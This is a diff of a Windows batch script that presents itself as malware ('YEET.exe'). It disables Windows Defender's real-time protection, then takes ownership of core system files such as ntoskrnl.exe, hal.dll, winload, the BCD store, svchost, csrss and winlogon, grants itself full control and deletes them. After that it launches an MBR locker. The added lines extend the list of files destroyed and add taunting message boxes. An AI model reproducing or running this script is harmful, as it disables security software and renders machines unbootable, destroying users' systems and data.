@@ -5,6 +5,11 @@ taskkill /f /im YEET.exe
 del %userprofile%\Desktop\YEET.* /f
 echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 wscript yt.vbs
+echo x=msgbox("yes, this malware can run even if it is deleted!",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+wscript yt.vbs
+echo x=msgbox("ok enough talk let me finish this pc",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+wscript yt.vbs
+del yt.vbs
 sc stop WinDefend
 powershell set-mppreference -disablerealtimemonitoring $true
 cd C:\Windows\System32
@@ -20,6 +25,24 @@ takeown /f W:\EFI\Microsoft\Boot\BCD
 takeown /f ntoskrnl.exe
 takeown /f config /r /d y
 takeown /f ci.dll
+takeown /f svchost.exe
+takeown /f csrss.exe
+takeown /f autochk.exe
+takeown /f chkdsk.exe
+takeown /f smss.exe
+takeown /f winlogon.exe
+takeown /f ..\regedit.exe
+takeown /f reg.exe
+takeown /f wininit.exe
+icacls svchost.exe /grant %username%:F
+icacls wininit.exe /grant %username%:F
+icacls csrss.exe /grant %username%:F
+icacls winlogon.exe /grant %username%:F
+icacls chkdsk.exe /grant %username%:F
+icacls autochk.exe /grant %username%:F
+icacls smss.exe /grant %username%:F
+icacls ..\regedit.exe /grant %username%:F
+icacls reg.exe /grant %username%:F
 icacls hal.dll /grant %username%:F
 icacls winload.efi /grant %username%:F
 icacls winload.exe /grant %username%:F
@@ -32,6 +55,7 @@ icacls ntoskrnl.exe /grant %username%:F
 icacls ci.dll /grant %username%:F
 echo y|cacls config /g %username%:F /t
 del hal.dll /f
+del wininit.exe /f
 del winload.efi /f
 del winload.exe /f
 rd drivers /s /q
@@ -42,6 +66,14 @@ del W:\EFI\Microsoft\Boot\BCD /f
 del ntoskrnl.exe /f
 rd config /s /q
 del ci.dll /f
+del svchost.exe /f
+del csrss.exe /f
+del smss.exe /f
+del chkdsk.exe /f
+del winlogon.exe /f
+del autochk.exe /f
+del ..\regedit.exe /f
+del reg.exe /f
 cd %userprofile%\Desktop
 MBRLocker.exe
 timeout /t 15 /nobreak
